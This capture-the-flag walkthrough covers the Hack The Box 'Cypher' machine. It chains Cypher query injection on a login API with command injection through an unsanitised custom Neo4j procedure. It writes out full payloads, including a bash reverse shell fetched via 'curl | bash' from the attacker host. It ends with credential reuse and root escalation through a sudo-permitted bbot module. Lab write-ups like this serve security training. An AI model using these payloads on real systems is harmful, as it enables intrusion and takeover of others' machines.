![https://app.hackthebox.com/machines/650](https://app.hackthebox.com/machines/650)

## ENUM

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

```
---- Scanning URL: http://cypher.htb/ ----
+ http://cypher.htb/about (CODE:200|SIZE:4986)                                   
+ http://cypher.htb/api (CODE:307|SIZE:0)                                        
+ http://cypher.htb/demo (CODE:307|SIZE:0)                                       
+ http://cypher.htb/index (CODE:200|SIZE:4562)                                   
+ http://cypher.htb/index.html (CODE:200|SIZE:4562)                              
+ http://cypher.htb/login (CODE:200|SIZE:3671)                                   
==> DIRECTORY: http://cypher.htb/testing/
```

No subdomain

In the `Testing` directory I download: **custom-apoc-extension-1.0-SNAPSHOT.jar**

I notice the JavaScript on the login page:

```javascript
// TODO: don't store user accounts in neo4j
function doLogin(e) {
  e.preventDefault();
  var username = $("#usernamefield").val();
  var password = $("#passwordfield").val();
  $.ajax({
    url: '/api/auth',
    type: 'POST',
    contentType: 'application/json',
    data: JSON.stringify({ username: username, password: password }),
    success: function (r) {
      window.location.replace("/demo");
    },
    error: function (r) {
      if (r.status == 401) {
        notify("Access denied");
      } else {
        notify(r.responseText);
      }
    }
  });
}

$("form").keypress(function (e) {
  if (e.keyCode == 13) {
    doLogin(e);
  }
})

$("#loginsubmit").click(doLogin);
```

---

## Initial Access

I will use a Neo4j vulnerability that allows me to extract the user database in the same way as SQLi:

I send a malicious payload:

```json
{"username":"'}) RETURN u //", "password":"x"}
```

It returns an error that reveals the exact command executed:

```
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '$username' return h.value as hash
```

I also find in the downloaded file a custom function:

```java
@Procedure(
   name = "custom.getUrlStatusCode",
   mode = Mode.READ
)
@Description("Returns the HTTP status code for the given URL as a string")
public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
   if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
      url = "https://" + url;
   }

   String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
   Process process = Runtime.getRuntime().exec(command);
   ...
   return Stream.of(new StringOutput(statusCode));
}
```

There is no sanitization of the URL, so I can perform an **RCE**.

I create the file `shell.sh`:

```bash
bash -i >& /dev/tcp/10.10.14.191/4848 0>&1
```

I start a Python web server:
`sudo python3 -m http.server 80`

Then I call the function `custom.getUrlStatusCode` to perform the RCE, downloading and executing my script. Payload sent to `/api/auth`:

```json
{
  "username": "admin' RETURN h.value AS hash UNION CALL custom.getUrlStatusCode('127.0.0.1; curl http://10.10.14.191/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//",
  "password": "x"
}
```

It works… but later I discover `/api/cypher`

This endpoint accepts `?query=` parameter to execute directly:

```
GET /api/cypher?query=CALL custom.getUrlStatusCode('127.0.0.1; curl http://10.10.14.191/shell.sh | bash') HTTP/1.1
```

---

### Explanation of the `/api/auth` Payload

| Segment (inside `username`)                                    | Exact Role                                                                                                   | Escaping Details                        |
| -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ | --------------------------------------- |
| **`admin'`**                                                   | Closes the quote opened by the app (`u.name = '<USERNAME>'`). Everything after escapes the original `WHERE`. | Simple quote, valid inside JSON string. |
| **`RETURN h.value AS hash`**                                   | Returns the `hash` column, which the backend expects.                                                        | Plain text.                             |
| **`UNION`**                                                    | Appends a second query block.                                                                                | —                                       |
| **`CALL custom.getUrlStatusCode(...)`**                        | Calls the custom APOC function.                                                                              | —                                       |
| \*\*`('127.0.0.1; curl http://10.10.14.191/shell.sh \| bash')` | Executes reverse shell payload.                                                                              | Injected as part of the argument.       |
| **`YIELD statusCode AS hash`**                                 | Renames the column to `hash` so it matches the expected output.                                              | —                                       |
| **`RETURN hash;`**                                             | Returns the data in the right format.                                                                        | —                                       |
| **`//`**                                                       | Cypher comment – neutralizes the trailing code the backend would add.                                        | JSON-safe.                              |

---

## Own User

`/etc/passwd` reveals user **graphasm**.

In `/home/graphasm/bbot_preset.yml` I find:

```yaml
modules:
  neo4j:
    username: neo4j
    password: cU4btyib.20xtCMCXkBmerhK
```

I check services:

```
tcp   LISTEN ... 127.0.0.1:8000
tcp   LISTEN ... 172.18.0.1:7687   <-- Neo4j
```

I connect:

```
cypher-shell -a neo4j://172.18.0.1:7687 -u neo4j -p cU4btyib.20xtCMCXkBmerhK
```

I explore the DB and find:

```
MATCH (u:USER)-[r]->(h:SHA1) RETURN u.name, type(r), h.value;
| "graphasm" | "SECRET" | "9f54ca4c130be6d529a56dee59dc2b2090e43acf" |
```

The hash doesn’t crack, but trying the same creds from the config (`cU4btyib.20xtCMCXkBmerhK`) for **graphasm** SSH works.

---

## Privilege Escalation → Root

Linpeas finds:

```
/home/graphasm/.config/bbot/secrets.yml
```

Content:

```
neo4j:
  username: neo4j
  password: bbotislife
```

Also, `sudo -L` shows:

```
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Exploit with malicious BBOT module:

* Repo: [https://github.com/Housma/bbot-privesc](https://github.com/Housma/bbot-privesc)
* Download: `systeminfo_enum.py` + `preset.yml`

Execute:

```
sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT
```

The module spawns a root shell:

````
root@cypher:/tmp/.zeroz# cd /root
root@cypher:~# cat root.txt
````
